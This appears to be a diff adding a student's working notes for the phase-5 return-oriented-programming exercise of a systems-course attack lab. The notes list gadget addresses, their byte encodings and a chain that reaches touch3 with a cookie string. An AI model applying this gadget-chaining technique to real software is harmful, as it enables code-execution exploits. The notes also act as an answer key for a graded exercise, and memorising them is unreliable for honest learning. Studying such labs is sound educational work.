@@ -180,4 +180,69 @@ exploit string can consist of
    and moves the value of %rsp to some register may be %rdi
 3. Return address of touch3 function
 
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+  
+above gadget is our live saver
+1. move %rsp (somehow) to %rdi or %rsi
+2. put offset on stack
+3. pop offset to %rdi or %rsi
+3. execute gadget add_xy
+4. move result from %rax to %rdi
+
+Step 1.
+move %rsp into %rdi
+48 89 e0 c3 # movq %rsp, %rax; retq; address: 0x401a06
+48 89 c7 c3 # movq %rax, %rdi; retq; address: 0x4019a2
+
+
+
+Step 2.
+offset
+
+Step 3.
+pop offset value in %rax and then move value of %eax into %esi
+
+58 90 c3 # pop %rax; retq; address: 0x4019ab
+
+89 c2 # movl %eax, %edx; address: 0x401a42 
+84 c0 # testb %al, %al
+c3    # retq
+
+89 d1 # movl %edx, %ecx; address: 0x401a69
+08 db # orb %bl, %bl
+c3    # retq
+
+89 ce # movl %ecx, %esi; address: 0x401a27 
+38 c0 # cmpb %al, %al
+c3    # retq
+
+Step 4. 
+Call gadget lea    (%rdi,%rsi,1),%rax; retq
+48 8d 04 37 c3 # lea    (%rdi,%rsi,1),%rax; retq address: 0x4019d6
+
+Step 5.
+move value of %rax to %rdi
+48 89 c7 c3 # movq %rax, %rdi; retq; address: 0x4019a2
+
+Step 6.
+call touch3
+address touch3
+
+Step 7.
+String representation of cookie
+  5         35
+  9         39
+  b         62
+  9         39
+  9         39
+  7         37
+  f         66
+  a         61
+  null      00
+
+
+
+
 =======================================================
